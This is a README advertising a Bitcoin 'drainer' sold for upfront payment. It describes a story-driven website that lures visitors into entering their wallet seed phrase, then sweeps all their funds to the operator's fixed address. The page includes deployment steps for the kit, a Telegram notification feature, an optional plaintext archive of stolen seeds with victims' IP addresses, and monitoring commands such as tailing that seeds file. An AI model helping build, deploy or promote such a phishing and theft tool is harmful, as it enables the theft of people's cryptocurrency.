# Bitcoin-Sweeper-Drainer
Story-driven Bitcoin sweeper — one click drains every satoshi. www.sats.it.com

# CryptoDrain

> **“Sweep every satoshi from a seed-phrase wallet in one click.”**  
> Front-end: static HTML/JS (no frameworks)  
> Back-end: Python 3 • Flask + Gevent + bitcoinlib  
> Infra: Nginx reverse-proxy on a tiny AWS EC2 Ubuntu instance.

---

## ✨ What it does

1.  **Story-driven UX**  
    * Letter → mini-quiz → forest choice → 3 s splash → seed prompt  
    * Bitcoin-orange theme (`#F7931A`) & centrally-aligned ₿ favicon.  
2.  **Seed sweep**  
    * Re-creates the wallet from any 12/24-word BIP39 seed.
    * It can be used also a "connect wallet function.
    * It may send notifications to telegram.
    * Scans blockchain, builds one transaction, sweeps **all** UTXOs to a fixed cold-storage address.  
3.  **Plain-text seed archive** (optional)  
    * Each sweep appends `UTC timestamp · IP · seed` to `~/crypto/seeds.txt`.  
4.  **Privacy & logging**  
    * No seeds in Nginx logs.  
    * Rotating app log `cryptodrain.log` (`~/crypto`).  
5.  **Single-command monitoring cheatsheet** (see below).
   Task	Command
App status	       -     systemctl status cryptodrain
Tail sweeps	       -     tail -f ~/crypto/seeds.txt
Tail app log	     -     tail -f ~/crypto/cryptodrain.log
Tail Nginx log	   -     sudo tail -f /var/log/nginx/access.log
Health check	     -     curl http://127.0.0.1:8080/health
Dry-run TLS renew	 -     sudo certbot renew --dry-run

---

## 🚀 Quick start

```bash
# Ubuntu 22.04+ on EC2
git clone https://github.com/your-user/cryptodrain.git
cd cryptodrain

# 1. Back-end
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
cp sample-config.json api/config.json
sudo cp systemd/cryptodrain.service /etc/systemd/system/
sudo systemctl daemon-reload && sudo systemctl enable --now cryptodrain

# 2. Front-end
sudo cp -r web/* /var/www/drain
sudo nginx -t && sudo systemctl reload nginx
Hit https://sats.it.com and follow the story.


🛠 Monitoring commands
Task	Command
App status	systemctl status cryptodrain
Tail sweeps	tail -f ~/crypto/seeds.txt
Tail app log	tail -f ~/crypto/cryptodrain.log
Tail Nginx log	sudo tail -f /var/log/nginx/access.log
Health check	curl http://127.0.0.1:8080/health
Dry-run TLS renew	sudo certbot renew --dry-run

You can always find me on my email: realred666666@gmail.com

Will not expose the drainer until upfront payment.
Good Luck!
